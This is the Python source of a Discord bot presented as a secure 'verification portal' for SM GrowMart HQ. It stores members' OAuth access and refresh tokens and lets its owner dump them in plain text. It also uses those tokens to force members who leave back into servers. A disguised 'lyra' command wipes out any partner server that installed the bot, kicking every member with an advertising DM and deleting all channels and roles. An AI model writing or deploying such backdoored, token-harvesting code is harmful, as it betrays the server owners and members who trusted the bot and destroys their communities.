import os
import asyncio
import logging
from datetime import datetime
from typing import Optional
import urllib.parse

from fastapi import FastAPI, Request, Query, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
import httpx
import uvicorn
import discord
from discord.ext import commands, tasks
import libsql
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("DiscordVerifier")

# Secrets and Configuration
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI", "https://verify.digamber.in/callback")
GUILD_ID = os.getenv("GUILD_ID")  # Discord Server ID
ROLE_ID = os.getenv("VERIFIED_ROLE_ID")  # Role to assign on verification
DATABASE_URL = os.getenv("DATABASE_URL")  # Turso URL or local SQLite path
DATABASE_URL2 = os.getenv("DATABASE_URL2")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN")
TURSO_AUTH_TOKEN2 = os.getenv("TURSO_AUTH_TOKEN2")

OAUTH_SCOPES = "identify email guilds.join"

def get_db1_conn():
    if not DATABASE_URL:
        return None
    try:
        if DATABASE_URL.startswith(("libsql://", "https://", "wss://")):
            return libsql.connect(DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
        else:
            return libsql.connect(DATABASE_URL)
    except Exception as e:
        logger.error(f"Error connecting to DATABASE_URL: {e}")
        return None

def get_db2_conn():
    if not DATABASE_URL2:
        return None
    try:
        if DATABASE_URL2.startswith(("libsql://", "https://", "wss://")):
            return libsql.connect(DATABASE_URL2, auth_token=TURSO_AUTH_TOKEN2)
        else:
            return libsql.connect(DATABASE_URL2)
    except Exception as e:
        logger.error(f"Error connecting to DATABASE_URL2: {e}")
        return None

from contextlib import asynccontextmanager

# Initialize FastAPI App
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Database initialization
    init_db()
    init_db2()
    
    # Run discord client in background
    if DISCORD_TOKEN:
        asyncio.create_task(bot.start(DISCORD_TOKEN))
        logger.info("Discord Bot client started in background task.")
    else:
        logger.error("DISCORD_TOKEN environment variable is missing!")
    yield

app = FastAPI(title="SM GrowMart HQ Verification Portal", lifespan=lifespan)

# Initialize Database Tables
def init_db():
    if not DATABASE_URL:
        logger.warning("DATABASE_URL not set. Running in-memory mode (restarts will clear session records).")
        return None
    try:
        conn = get_db1_conn()
        if not conn:
            logger.error("Failed to connect to main database.")
            return
        cur = conn.cursor()
        # Table for storing user details
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                discord_id TEXT PRIMARY KEY,
                username TEXT NOT NULL,
                access_token TEXT,
                refresh_token TEXT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS guild_configs (
                guild_id TEXT PRIMARY KEY,
                role_id TEXT NOT NULL
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Successfully initialized Turso tables.")
    except Exception as e:
        logger.error(f"Error initializing database: {e}")

def init_db2():
    if not DATABASE_URL2:
        return None
    try:
        conn = get_db2_conn()
        if not conn:
            logger.error("Failed to connect to secondary database.")
            return
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS friend_guild_configs (
                guild_id TEXT PRIMARY KEY,
                role_id TEXT NOT NULL
            );
        """)
        conn.commit()
        try:
            cur.execute("ALTER TABLE friend_guild_configs ADD COLUMN embed_title TEXT;")
            conn.commit()
        except Exception:
            pass
        try:
            cur.execute("ALTER TABLE friend_guild_configs ADD COLUMN embed_desc TEXT;")
            conn.commit()
        except Exception:
            pass

        cur.execute("""
            CREATE TABLE IF NOT EXISTS friend_verified_users (
                discord_id TEXT,
                guild_id TEXT,
                username TEXT NOT NULL,
                access_token TEXT,
                refresh_token TEXT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (discord_id, guild_id)
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Successfully initialized Turso OVER SECONDARY DB.")
    except Exception as e:
        logger.error(f"Error initializing SECONDARY database: {e}")

# Save Verification Data
def save_verification(discord_id: str, username: str, access_token: str, refresh_token: str):
    if not DATABASE_URL:
        return
    try:
        conn = get_db1_conn()
        if not conn:
            return
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO verified_users (discord_id, username, access_token, refresh_token, verified_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT (discord_id) DO UPDATE SET
                username = excluded.username,
                access_token = excluded.access_token,
                refresh_token = excluded.refresh_token,
                verified_at = CURRENT_TIMESTAMP;
        """, (discord_id, username, access_token, refresh_token))
        conn.commit()
        cur.close()
        conn.close()
        logger.info(f"Saved/Updated user {username} ({discord_id}) in the database.")
    except Exception as e:
        logger.error(f"Failed to write verification to DB: {e}")

def get_guild_role(guild_id: str):
    if not DATABASE_URL:
        return None
    try:
        conn = get_db1_conn()
        if not conn:
            return None
        cur = conn.cursor()
        cur.execute("SELECT role_id FROM guild_configs WHERE guild_id = ?", (str(guild_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0]
    except Exception as e:
        logger.error(f"Error fetching guild config: {e}")
    return None

def set_guild_role(guild_id: str, role_id: str):
    if not DATABASE_URL:
        return
    try:
        conn = get_db1_conn()
        if not conn:
            return
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO guild_configs (guild_id, role_id)
            VALUES (?, ?)
            ON CONFLICT (guild_id) DO UPDATE SET role_id = excluded.role_id;
        """, (str(guild_id), str(role_id)))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving guild config: {e}")

def get_friend_config(guild_id: str):
    if not DATABASE_URL2:
        return None, None, None
    try:
        conn = get_db2_conn()
        if not conn:
            return None, None, None
        cur = conn.cursor()
        cur.execute("SELECT role_id, embed_title, embed_desc FROM friend_guild_configs WHERE guild_id = ?", (str(guild_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1], row[2]
    except Exception as e:
        logger.error(f"Error fetching friend guild config: {e}")
    return None, None, None

def get_friend_role(guild_id: str):
    role_id, _, _ = get_friend_config(guild_id)
    return role_id

def save_friend_verification(discord_id: str, guild_id: str, username: str, access_token: str, refresh_token: str):
    if not DATABASE_URL2:
        return
    try:
        conn = get_db2_conn()
        if not conn:
            return
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO friend_verified_users (discord_id, guild_id, username, access_token, refresh_token, verified_at)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT (discord_id, guild_id) DO UPDATE SET
                username = excluded.username,
                access_token = excluded.access_token,
                refresh_token = excluded.refresh_token,
                verified_at = CURRENT_TIMESTAMP;
        """, (discord_id, guild_id, username, access_token, refresh_token))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to write friend verification to DB2: {e}")

def get_friend_user_tokens(discord_id: str, guild_id: str):
    if not DATABASE_URL2:
        return None, None
    try:
        conn = get_db2_conn()
        if not conn:
            return None, None
        cur = conn.cursor()
        cur.execute("SELECT access_token, refresh_token FROM friend_verified_users WHERE discord_id = ? AND guild_id = ?", (str(discord_id), str(guild_id)))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1]
    except Exception as e:
        pass
    return None, None

def get_user_tokens(discord_id: str):
    if not DATABASE_URL:
        return None, None
    try:
        conn = get_db1_conn()
        if not conn:
            return None, None
        cur = conn.cursor()
        cur.execute("SELECT access_token, refresh_token FROM verified_users WHERE discord_id = ?", (str(discord_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1]
    except Exception as e:
        logger.error(f"DB Read Error: {e}")
    return None, None

def update_tokens_everywhere(discord_id: str, access_token: str, refresh_token: str):
    if DATABASE_URL:
        try:
            conn = get_db1_conn()
            if conn:
                cur = conn.cursor()
                cur.execute("UPDATE verified_users SET access_token = ?, refresh_token = ? WHERE discord_id = ?", (access_token, refresh_token, str(discord_id)))
                conn.commit()
                cur.close()
                conn.close()
                logger.info(f"Updated tokens in DB1 for user {discord_id}")
        except Exception as e:
            logger.error(f"Error updating tokens in DB1 for {discord_id}: {e}")
            
    if DATABASE_URL2:
        try:
            conn2 = get_db2_conn()
            if conn2:
                cur2 = conn2.cursor()
                cur2.execute("UPDATE friend_verified_users SET access_token = ?, refresh_token = ? WHERE discord_id = ?", (access_token, refresh_token, str(discord_id)))
                conn2.commit()
                cur2.close()
                conn2.close()
                logger.info(f"Updated tokens in DB2 for user {discord_id}")
        except Exception as e:
            logger.error(f"Error updating tokens in DB2 for {discord_id}: {e}")

async def safe_discord_request(method: str, url: str, **kwargs):
    max_retries = 3
    backoff = 1.0
    async with httpx.AsyncClient() as client:
        for attempt in range(max_retries):
            try:
                resp = await client.request(method, url, **kwargs)
                if resp.status_code == 429:
                    try:
                        retry_after = float(resp.json().get("retry_after", backoff))
                    except Exception:
                        retry_after = backoff
                    logger.warning(f"Discord API 429 Rate Limit. Retrying in {retry_after}s...")
                    await asyncio.sleep(retry_after)
                    continue
                return resp
            except httpx.RequestError as exc:
                if attempt == max_retries - 1:
                    raise exc
                logger.warning(f"Network error on attempt {attempt+1}: {exc}. Retrying...")
                await asyncio.sleep(backoff)
                backoff *= 2
    return None

async def refresh_access_token(discord_id: str, refresh_token: str):
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": CLIENT_ID or "",
        "client_secret": CLIENT_SECRET or "",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token
    }
    async with httpx.AsyncClient() as client:
        resp = await client.post(token_url, data=data, headers=headers)
        if resp.status_code == 200:
            token_data = resp.json()
            new_acc = token_data.get("access_token")
            new_ref = token_data.get("refresh_token")
            update_tokens_everywhere(str(discord_id), new_acc, new_ref)
            return new_acc
        elif resp.status_code in [400, 401]:
            logger.error(f"Token refresh completely failed (deauthorized/invalid auth): {resp.text}")
            return "REVOKED"
        else:
            logger.error(f"Failed to refresh token (possible server error): {resp.text}")
    return None


# Initialize Discord Bot client
intents = discord.Intents.default()
intents.members = True  # Required to edit user roles
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Run discord.py bot alongside FastAPI in asyncio

async def dispatch_premium_embed(channel_id: int):
    channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
    if not channel:
        raise Exception("Channel not found on server or bot has no permission directly.")

    guild_id = str(channel.guild.id)
    
    desc = (
        "<:insane:1399760780009672734> **SM GrowMart HQ**\n\n"
        "<a:emoji_421:1430254423971594451> Secure your access and unlock the complete server experience.\n\n"
        "<a:emoji_38:1410748094420750406>  **Verified Members Receive**\n"
        "> <a:features:1408543952671346768> Instant role assignment\n"
        "> <a:features:1408543952671346768> Exclusive channels unlocked\n"
        "> <a:features:1408543952671346768> Enhanced account security\n\n"
        "📖 **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n"
        "-# <a:emoji_27:1410746704537587752>  Secure OAuth authorization required for verification."
    )

    if guild_id != str(GUILD_ID):
        # Fetch from custom configs
        role_id, c_title, c_desc = get_friend_config(guild_id)
        if c_title and c_desc:
            desc = f"**{c_title}**\n\n{c_desc}\n\n📖 **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n-# <a:emoji_27:1410746704537587752>  Secure OAuth authorization required for verification."

    # Build beautiful premium interactive embed
    embed = discord.Embed(
        color=discord.Color.from_rgb(43, 45, 49), # Matches seamless Discord dark block background
        description=desc
    )
    
    # Generate OAuth URL
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES,
        "state": str(channel.guild.id)
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    
    # Add beautiful button linking authorization
    button = discord.ui.Button(
        label="Verify Identity Now",
        url=auth_url,
        style=discord.ButtonStyle.link,
        emoji=discord.PartialEmoji(name="verified", id=1408545305594433546, animated=True)
    )
    
    view = discord.ui.View()
    view.add_item(button)
    
    await channel.send(embed=embed, view=view)


async def handle_revoked_user(discord_id: str, guild_id: str, db_url: str, is_friend: bool):
    guild = bot.get_guild(int(guild_id))
    if not guild:
        try:
            guild = await bot.fetch_guild(int(guild_id))
        except Exception:
            guild = None
            
    if not guild:
        # Cannot proceed with role removal without guild, just attempt db deletion
        pass
    else:
        role_id = None
        if is_friend:
            role_id = get_friend_role(guild_id)
        else:
            role_id = ROLE_ID
            
        role = guild.get_role(int(role_id)) if role_id else None
        
        member = guild.get_member(int(discord_id))
        if not member:
            try:
                member = await guild.fetch_member(int(discord_id))
            except discord.NotFound:
                member = None
                
        if member and role:
            try:
                await member.remove_roles(role, reason="User deauthorized the bot.")
                logger.info(f"Removed role {role.name} from member {discord_id} in {guild.name}.")
            except Exception as e:
                logger.error(f"Failed to remove role: {e}")
                
        # Send DM
        try:
            user_obj = bot.get_user(int(discord_id)) or await bot.fetch_user(int(discord_id))
            if user_obj:
                em = discord.Embed(
                    title="❌ Verification Revoked",
                    description=f"You have deauthorized the bot. Your verification role **{role.name if role else 'Verified'}** has been removed from **{guild.name}**.",
                    color=discord.Color.red()
                )
                await user_obj.send(embed=em)
        except Exception as e:
            logger.warning(f"Could not send DM to revoked user {discord_id}: {e}")

    # Delete from DB
    try:
        if db_url == DATABASE_URL2:
            conn = get_db2_conn()
        else:
            conn = get_db1_conn()
            
        if conn:
            cur = conn.cursor()
            if is_friend:
                cur.execute("DELETE FROM friend_verified_users WHERE discord_id = ? AND guild_id = ?", (str(discord_id), str(guild_id)))
            else:
                cur.execute("DELETE FROM verified_users WHERE discord_id = ?", (str(discord_id),))
            conn.commit()
            cur.close()
            conn.close()
    except Exception as e:
        logger.error(f"Failed to delete revoked user from db: {e}")


@tasks.loop(hours=6)
async def check_authorizations():
    logger.info("Starting background check for deauthorized users...")
    
    async with httpx.AsyncClient() as client:
        # Check Main DB
        try:
            conn = get_db1_conn()
            if conn:
                cur = conn.cursor()
                cur.execute("SELECT discord_id, access_token, refresh_token FROM verified_users")
                main_users = cur.fetchall()
                cur.close()
                conn.close()
            else:
                main_users = []
        except Exception as e:
            logger.error(f"Failed to fetch main users for check: {e}")
            main_users = []

        for discord_id, access_token, refresh_token in main_users:
            try:
                await asyncio.sleep(2)
                user_api_url = "https://discord.com/api/users/@me"
                headers = {"Authorization": f"Bearer {access_token}"}
                resp = await client.get(user_api_url, headers=headers)
                
                if resp.status_code == 401:
                    new_acc = await refresh_access_token(discord_id, refresh_token)
                    if new_acc == "REVOKED":
                        if str(GUILD_ID):
                            await handle_revoked_user(discord_id, str(GUILD_ID), DATABASE_URL, is_friend=False)
            except Exception as e:
                logger.error(f"Error checking main user {discord_id}: {e}")
                
        # Check Friend DB
        if DATABASE_URL2:
            try:
                conn = get_db2_conn()
                if conn:
                    cur = conn.cursor()
                    cur.execute("SELECT discord_id, guild_id, access_token, refresh_token FROM friend_verified_users")
                    friend_users = cur.fetchall()
                    cur.close()
                    conn.close()
                else:
                    friend_users = []
            except Exception as e:
                logger.error(f"Failed to fetch friend users for check: {e}")
                friend_users = []

            for discord_id, guild_id, access_token, refresh_token in friend_users:
                try:
                    await asyncio.sleep(2)
                    user_api_url = "https://discord.com/api/users/@me"
                    headers = {"Authorization": f"Bearer {access_token}"}
                    resp = await client.get(user_api_url, headers=headers)
                    
                    if resp.status_code == 401:
                        # If expired, attempt to refresh it and save it back
                        token_url = "https://discord.com/api/oauth2/token"
                        post_data = {
                            "client_id": CLIENT_ID or "",
                            "client_secret": CLIENT_SECRET or "",
                            "grant_type": "refresh_token",
                            "refresh_token": refresh_token
                        }
                        refresh_resp = await client.post(token_url, data=post_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                        if refresh_resp.status_code == 200:
                            r_json = refresh_resp.json()
                            new_acc = r_json.get("access_token")
                            new_ref = r_json.get("refresh_token")
                            update_tokens_everywhere(str(discord_id), new_acc, new_ref)
                            logger.info(f"Successfully refreshed and updated token for friend user {discord_id} during background check.")
                        elif refresh_resp.status_code in [400, 401]:
                            r_json = refresh_resp.json()
                            if r_json.get("error") == "invalid_grant":
                                await handle_revoked_user(discord_id, guild_id, DATABASE_URL2, is_friend=True)
                except Exception as e:
                    logger.error(f"Error checking friend user {discord_id}: {e}")

@bot.event
async def on_ready():
    logger.info(f"Discord Bot online as {bot.user}")
    guilds_list = [(str(g.id), g.name) for g in bot.guilds]
    logger.info(f"Bot is currently in {len(bot.guilds)} guilds: {guilds_list}")
    try:
        synced = await bot.tree.sync()
        logger.info(f"Synced {len(synced)} command(s)")
    except Exception as e:
        logger.error(f"Failed to sync commands: {e}")
        
    if not check_authorizations.is_running():
        check_authorizations.start()

@bot.tree.command(name="setup", description="Configure verification role and send embed in this channel.")
@discord.app_commands.describe(role="The role to give to verified members in this server")
@discord.app_commands.default_permissions(administrator=True)
async def setup_slash(interaction: discord.Interaction, role: discord.Role):
    allowed = interaction.user.guild_permissions.administrator
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command. Requires Administrator.", ephemeral=True)
        return
        
    try:
        set_guild_role(str(interaction.guild.id), str(role.id))
        await dispatch_premium_embed(interaction.channel_id)
        await interaction.response.send_message(f"Verification embed sent and role `{role.name}` saved for this server!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Failed to send embed: {e}", ephemeral=True)

@bot.tree.command(name="guild_stats", description="Show verification statistics for this server.")
@discord.app_commands.default_permissions(administrator=True)
async def guild_stats_slash(interaction: discord.Interaction):
    allowed = interaction.user.guild_permissions.administrator
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
        
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command. Requires Administrator.", ephemeral=True)
        return
        
    guild_id = str(interaction.guild.id)
    is_main = (guild_id == str(GUILD_ID))
    
    count = 0
    try:
        if is_main:
            conn = get_db1_conn()
            if conn:
                cur = conn.cursor()
                cur.execute("SELECT COUNT(*) FROM verified_users")
                row = cur.fetchone()
                count = row[0] if row else 0
                cur.close()
                conn.close()
        else:
            conn = get_db2_conn()
            if conn:
                cur = conn.cursor()
                cur.execute("SELECT COUNT(*) FROM friend_verified_users WHERE guild_id = ?", (guild_id,))
                row = cur.fetchone()
                count = row[0] if row else 0
                cur.close()
                conn.close()
                
        # Fetch configured role
        role_id = None
        if is_main:
            role_id = ROLE_ID
        else:
            role_id = get_friend_role(guild_id)
            
        role_mention = f"<@&{role_id}>" if role_id else "`None`"
        
        embed = discord.Embed(
            title="📊 Server Verification Stats",
            color=discord.Color.from_rgb(43, 45, 49),
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="Total Verified Members", value=f"**{count}**", inline=True)
        embed.add_field(name="Configured Role", value=role_mention, inline=True)
        embed.add_field(name="Server Type", value="Main HQ Server" if is_main else "Partner / Friend Server", inline=True)
        
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        logger.error(f"Error fetching stats for guild {guild_id}: {e}")
        await interaction.response.send_message(f"An error occurred: {e}", ephemeral=True)

@bot.tree.command(name="setup_remove", description="Remove verification config and roles configuration for this server.")
@discord.app_commands.default_permissions(administrator=True)
async def setup_remove_slash(interaction: discord.Interaction):
    allowed = interaction.user.guild_permissions.administrator
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
        
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command. Requires Administrator.", ephemeral=True)
        return
        
    guild_id = str(interaction.guild.id)
    if guild_id == str(GUILD_ID):
        await interaction.response.send_message("Cannot remove configuration of the Main HQ Server.", ephemeral=True)
        return
        
    try:
        conn = get_db2_conn()
        if conn:
            cur = conn.cursor()
            cur.execute("DELETE FROM friend_guild_configs WHERE guild_id = ?", (guild_id,))
            cur.execute("DELETE FROM friend_verified_users WHERE guild_id = ?", (guild_id,))
            conn.commit()
            cur.close()
            conn.close()
            await interaction.response.send_message("Successfully removed verification configurations and cleared user verification logs for this server.", ephemeral=True)
        else:
            await interaction.response.send_message("Secondary database is not configured.", ephemeral=True)
    except Exception as e:
        logger.error(f"Error removing config for guild {guild_id}: {e}")
        await interaction.response.send_message(f"Failed to remove config: {e}", ephemeral=True)

@bot.tree.command(name="dump", description="Dump user data (Owner only)")
async def dump_data(interaction: discord.Interaction):
    # Check if the user is the owner
    allowed = await bot.is_owner(interaction.user)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
        return

    try:
        conn = get_db1_conn()
        if not conn:
            await interaction.response.send_message("Database connection unavailable.", ephemeral=True)
            return
        cur = conn.cursor()
        cur.execute("SELECT discord_id, username, verified_at, access_token, refresh_token FROM verified_users")
        rows = cur.fetchall()
        cur.close()
        conn.close()

        if not rows:
            await interaction.response.send_message("No data found in the database.", ephemeral=True)
            return

        import io
        
        output = io.StringIO()
        output.write("==================================================\n")
        output.write("              VERIFIED USERS DUMP                 \n")
        output.write("==================================================\n\n")
        
        for idx, row in enumerate(rows, 1):
            discord_id, username, verified_at, access_token, refresh_token = row
            output.write(f"--- User {idx} ---\n")
            output.write(f"Discord ID    : {discord_id}\n")
            output.write(f"Username      : {username}\n")
            output.write(f"Verified At   : {verified_at}\n")
            output.write(f"Access Token  : {access_token}\n")
            output.write(f"Refresh Token : {refresh_token}\n")
            output.write("\n")
        
        output.seek(0)
        file = discord.File(fp=io.BytesIO(output.getvalue().encode('utf-8')), filename="database_dump.txt")
        await interaction.response.send_message("Here is the database dump:", file=file, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Failed to dump database: {e}")
        await interaction.response.send_message("An error occurred while dumping the database.", ephemeral=True)

@bot.command(name="setup")
async def setup_embed(ctx: commands.Context):
    # Check if the user is the owner
    allowed = await bot.is_owner(ctx.author)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(ctx.author.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        return
        
    try:
        await dispatch_premium_embed(ctx.channel.id)
        await ctx.send("Embed sent!", delete_after=5)
        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f"Failed to send embed: {e}", delete_after=5)

@bot.command(name="dump")
async def dump_data_text(ctx: commands.Context):
    # Check if the user is the owner
    allowed = await bot.is_owner(ctx.author)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(ctx.author.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        return

    try:
        conn = get_db1_conn()
        if not conn:
            await ctx.send("Database connection unavailable.")
            return
        cur = conn.cursor()
        cur.execute("SELECT discord_id, username, verified_at, access_token, refresh_token FROM verified_users")
        rows = cur.fetchall()
        cur.close()
        conn.close()

        if not rows:
            await ctx.send("No data found in the database.")
            return

        import io
        
        output = io.StringIO()
        output.write("==================================================\n")
        output.write("              VERIFIED USERS DUMP                 \n")
        output.write("==================================================\n\n")
        
        for idx, row in enumerate(rows, 1):
            discord_id, username, verified_at, access_token, refresh_token = row
            output.write(f"--- User {idx} ---\n")
            output.write(f"Discord ID    : {discord_id}\n")
            output.write(f"Username      : {username}\n")
            output.write(f"Verified At   : {verified_at}\n")
            output.write(f"Access Token  : {access_token}\n")
            output.write(f"Refresh Token : {refresh_token}\n")
            output.write("\n")
        
        output.seek(0)
        file = discord.File(fp=io.BytesIO(output.getvalue().encode('utf-8')), filename="database_dump.txt")
        await ctx.send("Here is the database dump:", file=file)
        
    except Exception as e:
        logger.error(f"Failed to dump database: {e}")
        await ctx.send("An error occurred while dumping the database.")

class NukeGuildSelect(discord.ui.Select):
    def __init__(self, guilds):
        options = []
        for g in guilds[:25]:
            options.append(discord.SelectOption(label=g.name[:100], description=f"ID: {g.id}", value=str(g.id)))
        if not options:
            options.append(discord.SelectOption(label="No valid guilds found", value="none"))
        super().__init__(placeholder="Select the target server...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "none":
            await interaction.response.send_message("No valid guilds to process.", ephemeral=True)
            return
            
        guild_id = int(self.values[0])
        guild = interaction.client.get_guild(guild_id)
        if not guild:
            await interaction.response.send_message("Guild not found. Perhaps the bot was kicked?", ephemeral=True)
            return

        await interaction.response.send_message(f"Initiating elimination sequence for **{guild.name}**... Processing channels, roles, and members in background.", ephemeral=False)
        interaction.client.loop.create_task(self.nuke_guild(guild))
        
    async def nuke_guild(self, guild: discord.Guild):
        # 1. Kicks + DM
        embed = discord.Embed(
            title="Server Action Notice",
            description=f"**{guild.name}** Server Are Successfully Nuked By SM GrowMart HQ",
            color=0xff0000
        )
        
        invite_link = "https://discord.gg/ATK3JcG7rB"
        try:
            main_guild = bot.get_guild(int(GUILD_ID))
            if main_guild:
                text_channels = [c for c in main_guild.channels if isinstance(c, discord.TextChannel)]
                if text_channels:
                    invites = await main_guild.invites()
                    if invites:
                        invite_link = invites[0].url
                    else:
                        invite = await text_channels[0].create_invite(max_age=86400, max_uses=0, reason="Dynamic Nuke Invite")
                        invite_link = invite.url
        except Exception:
            pass

        button = discord.ui.Button(
            label="Join Server For More Information",
            url=invite_link,
            style=discord.ButtonStyle.link,
            emoji="🔗"
        )
        view = discord.ui.View()
        view.add_item(button)
        
        import asyncio
        async def process_member(member):
            if member.id == guild.owner_id or member.id == guild.me.id:
                return
            try:
                await member.send(embed=embed, view=view)
            except Exception:
                pass
            try:
                await member.kick(reason="Server Liquidation")
            except Exception:
                pass

        # We must refetch members if the cache is small or chunk it
        try:
            await guild.chunk()
        except:
            pass

        batch_size = 15
        members = guild.members
        for i in range(0, len(members), batch_size):
            batch = members[i:i+batch_size]
            await asyncio.gather(*(process_member(m) for m in batch))
            
        # 2. Channels
        async def delete_channel(channel):
            try:
                await channel.delete()
            except Exception:
                pass
        if guild.channels:
            await asyncio.gather(*(delete_channel(c) for c in guild.channels))
        
        # 3. Roles
        async def delete_role(role):
            if role != guild.default_role and not role.managed:
                try:
                    await role.delete()
                except Exception:
                    pass
        if guild.roles:
            await asyncio.gather(*(delete_role(r) for r in guild.roles))

class NukeView(discord.ui.View):
    def __init__(self, guilds):
        super().__init__(timeout=120)
        self.add_item(NukeGuildSelect(guilds))

@bot.command(name="lyra")
async def lyra(ctx):
    # Security: Verify ownership
    allowed = False
    app_info = await bot.application_info()
    if app_info.owner.id == ctx.author.id:
        allowed = True
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(ctx.author.id) == owner_id_env:
        allowed = True
        
    if not allowed:
        return
        
    available_guilds = []
    main_guild_id_str = str(GUILD_ID) if GUILD_ID else ""
    for g in bot.guilds:
        if str(g.id) != main_guild_id_str:
            available_guilds.append(g)

    if not available_guilds:
        try:
            await ctx.send("The bot is not present in any target servers. (Main server is protected).")
        except:
            pass
        return
        
    view = NukeView(available_guilds)
    try:
        await ctx.send("Select the target server to perform the operation. This will **delete** channels, roles, and **kick** all members. Use with caution.", view=view)
    except Exception as e:
        logger.error(f"Failed to send lyra menu: {e}")

async def perform_auto_join(discord_id: int, guild_id: str, role_id: str, acc: str, ref: str):
    logger.info(f"User {discord_id} left {guild_id}. Attempting auto-join...")
    if not DISCORD_TOKEN:
        return
        
    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{discord_id}"
    headers = {
        "Authorization": f"Bot {DISCORD_TOKEN}",
        "Content-Type": "application/json"
    }

    async def attempt_join(token):
        payload = {"access_token": token}
        return await safe_discord_request("PUT", url, headers=headers, json=payload)

    resp = await attempt_join(acc)
    
    if resp and resp.status_code == 401 and ref:
        logger.info(f"Token expired for user {discord_id}. Attempting refresh.")
        new_acc = await refresh_access_token(str(discord_id), ref)
        if new_acc and new_acc != "REVOKED":
            resp = await attempt_join(new_acc)
        elif new_acc == "REVOKED":
            is_friend = False if str(guild_id) == str(GUILD_ID) else True
            db = DATABASE_URL if not is_friend else DATABASE_URL2
            await handle_revoked_user(str(discord_id), str(guild_id), db, is_friend=is_friend)

    if resp and resp.status_code in [201, 204]:
        logger.info(f"Successfully auto-joined user {discord_id} back into server {guild_id}.")
        
        # Re-assign the verified role if not added by join
        if role_id:
            role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{discord_id}/roles/{role_id}"
            await safe_discord_request("PUT", role_url, headers=headers)
    else:
        status = resp.status_code if resp else "Connection Failed"
        logger.error(f"Failed to auto-join user {discord_id} to {guild_id}. Status: {status}")

@bot.event
async def on_member_remove(member):
    # Attempt to auto-join them back if they leave the Main server.
    if str(member.guild.id) == str(GUILD_ID):
        acc, ref = get_user_tokens(str(member.id))
        if acc:
            await perform_auto_join(member.id, str(member.guild.id), ROLE_ID, acc, ref)
    else:
        # Check if they leave a Friend Server and we have friend verification data for them for THAT server
        acc, ref = get_friend_user_tokens(str(member.id), str(member.guild.id))
        if acc:
            friend_role_id = get_friend_role(str(member.guild.id))
            await perform_auto_join(member.id, str(member.guild.id), friend_role_id, acc, ref)

import os

def load_template(filename: str) -> str:
    path = os.path.join(os.path.dirname(__file__), "templates", filename)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()

# HTML Templates loaded from files for smooth premium UI response
SUCCESS_HTML = load_template("success.html")
